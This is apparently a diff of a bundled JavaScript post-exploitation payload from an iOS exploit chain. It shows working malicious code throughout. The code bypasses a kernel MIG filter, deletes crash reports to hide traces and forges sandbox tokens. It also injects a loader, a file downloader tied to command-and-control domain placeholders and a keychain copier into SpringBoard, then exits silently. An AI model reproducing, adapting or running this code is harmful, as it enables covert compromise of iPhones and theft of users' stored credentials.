-/******/ 			exports: {}
-/******/ 		};
-/******/ 	
-/******/ 		// Execute the module function
-/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
-/******/ 	
-/******/ 		// Return the exports of the module
-/******/ 		return module.exports;
-/******/ 	}
-/******/ 	
-/************************************************************************/
-/******/ 	/* webpack/runtime/define property getters */
-/******/ 	(() => {
-/******/ 		// define getter functions for harmony exports
-/******/ 		__webpack_require__.d = (exports, definition) => {
-/******/ 			for(var key in definition) {
-/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
-/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
-/******/ 				}
-/******/ 			}
-/******/ 		};
-/******/ 	})();
-/******/ 	
-/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
-/******/ 	(() => {
-/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
-/******/ 	})();
-/******/ 	
-/******/ 	/* webpack/runtime/make namespace object */
-/******/ 	(() => {
-/******/ 		// define __esModule on exports
-/******/ 		__webpack_require__.r = (exports) => {
-/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
-/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
-/******/ 			}
-/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
-/******/ 		};
-/******/ 	})();
-/******/ 	
-/************************************************************************/
+ 	});
+
+ 	
+ 	var __webpack_module_cache__ = {};
+ 	
+ 	
+ 	function __webpack_require__(moduleId) {
+ 		
+ 		var cachedModule = __webpack_module_cache__[moduleId];
+ 		if (cachedModule !== undefined) {
+ 			return cachedModule.exports;
+ 		}
+ 		
+ 		var module = __webpack_module_cache__[moduleId] = {
+ 			
+ 			
+ 			exports: {}
+ 		};
+ 	
+ 		
+ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
+ 	
+ 		
+ 		return module.exports;
+ 	}
+ 	
+
+ 	
+ 	(() => {
+ 		
+ 		__webpack_require__.d = (exports, definition) => {
+ 			for(var key in definition) {
+ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
+ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
+ 				}
+ 			}
+ 		};
+ 	})();
+ 	
+ 	
+ 	(() => {
+ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
+ 	})();
+ 	
+ 	
+ 	(() => {
+ 		
+ 		__webpack_require__.r = (exports) => {
+ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
+ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
+ 			}
+ 			Object.defineProperty(exports, '__esModule', { value: true });
+ 		};
+ 	})();
+ 	
+
 var __webpack_exports__ = {};
-// This entry needs to be wrapped in an IIFE because it needs to be isolated against other modules in the chunk.
+
 (() => {
-/*!*********************!*\
-  !*** ./src/main.js ***!
-  \*********************/
+
 __webpack_require__.r(__webpack_exports__);
-/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
-/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
-/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/TaskRop */ "./src/libs/TaskRop/TaskRop.js");
-/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Task */ "./src/libs/TaskRop/Task.js");
-/* harmony import */ var libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/TaskRop/Sandbox */ "./src/libs/TaskRop/Sandbox.js");
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var _InjectJS__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./InjectJS */ "./src/InjectJS.js");
-/* harmony import */ var libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! libs/Driver/Driver */ "./src/libs/Driver/Driver.js");
-/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
-/* harmony import */ var _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! !raw-loader!../dist/MigFilterBypassThread.js */ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js");
-/* harmony import */ var _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! !raw-loader!loader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js");
-/* harmony import */ var _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! !raw-loader!file_downloader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js");
-/* harmony import */ var _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! !raw-loader!keychain_copier.js */ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js");
-/* harmony import */ var _raw_loader_ds_net_native_js__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! !raw-loader!ds_net_native.js */ "./node_modules/raw-loader/dist/cjs.js!./src/ds_net_native.js");
+ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/Chain/Native.js");
+ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/Chain/Chain.js");
+ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/TaskRop/TaskRop.js");
+ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( "./src/libs/TaskRop/Task.js");
+ var libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__( "./src/libs/TaskRop/Sandbox.js");
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var _InjectJS__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__( "./src/InjectJS.js");
+ var libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__( "./src/libs/Driver/Driver.js");
+ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__( "./src/libs/TaskRop/RemoteCall.js");
+ var _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__( "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js");
+ var _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__( "./node_modules/raw-loader/dist/cjs.js!./src/loader.js");
+ var _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__( "./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js");
+ var _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__( "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js");
 
 
 
@@ -8221,7 +7896,7 @@ __webpack_require__.r(__webpack_exports__);
 
 
 
-//import KeychainDumpCode from '!raw-loader!keychain_dump.js'
+
 
 class MigFilterBypass {
 
@@ -8268,9 +7943,9 @@ class MigFilterBypass {
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x48n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migKernelStackLR));
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x50n, this.#monitorThread1Ptr);
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x58n, this.#monitorThread2Ptr);
-		//Native.write64(threadMem, lock.kernelSlide);
-		//Native.write64(threadMem + 0x8n, lock.lockAddr);
-		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
+		
+		
+		
 		const threadCode = "fcall_init(); " + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);
 
@@ -8318,7 +7993,7 @@ function xnuVersion() {
 }
 
 const TAG = "MAIN";
-//const targetProcess = "bluetoothd";
+
 const targetProcess = "SpringBoard";
 
 function start() {
@@ -8327,7 +8002,7 @@ function start() {
 	globalThis.xnuVersion = xnuVersion();
 	let ver = globalThis.xnuVersion;
 
-	// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
+	
 	if (ver.major == 24 && ver.minor >= 4) {
 
 		mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
@@ -8355,7 +8030,7 @@ function start() {
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
 
-	// Inject agentLoader into SpringBoard (sets up memory pressure)
+	
 	let agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
 	if (agentLoader.inject()) {
 		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
@@ -8363,7 +8038,7 @@ function start() {
 		agentLoader.destroy();
 	}
 
-	// Wait then inject downloader_stub into SpringBoard
+	
 	for (let i = 1; i <= 5; i++) {
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
 	}
@@ -8372,7 +8047,7 @@ function start() {
 	var DS_CHANNEL_CODE = "__CHANNEL_CODE__";
 	var DS_LANDING_DOMAIN = "__LANDING_DOMAIN__";
 	var DS_DEVICE_ID = "__DEVICE_ID__";
-	var dlCode = 'var CC="' + DS_CHANNEL_CODE + '";var CD="' + DS_C2_DOMAIN + '";var DM="' + DS_LANDING_DOMAIN + '";var DV="' + DS_DEVICE_ID + '";\n' + _raw_loader_ds_net_native_js__WEBPACK_IMPORTED_MODULE_13__["default"] + '\n' + _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__["default"];
+	var dlCode = 'var CC="' + DS_CHANNEL_CODE + '";var CD="' + DS_C2_DOMAIN + '";var DM="' + DS_LANDING_DOMAIN + '";var DV="' + DS_DEVICE_ID + '";\n' + _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__["default"];
 	let fileDownloader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, dlCode, migFilterBypass);
 	if (fileDownloader.inject()) {
 		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(fileDownloader.task);
@@ -8388,7 +8063,7 @@ try {
 	start();
 }
 catch (error) {
-	// Error handling without logging
+	
 }
 finally {
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
@@ -8396,14 +8071,14 @@ finally {
 
 })();
 
-/******/ })()
+ })()
 ;
   } catch (error) {
 	  LOG(`Main function resulted with an error: ${error}`);
 	  LOG("stack: " + error.stack);
   } finally {
-	  // Post-Exp done.
-	  // Exiting the process.
+	  
+	  
 	  exit(0n);
   }
 })();
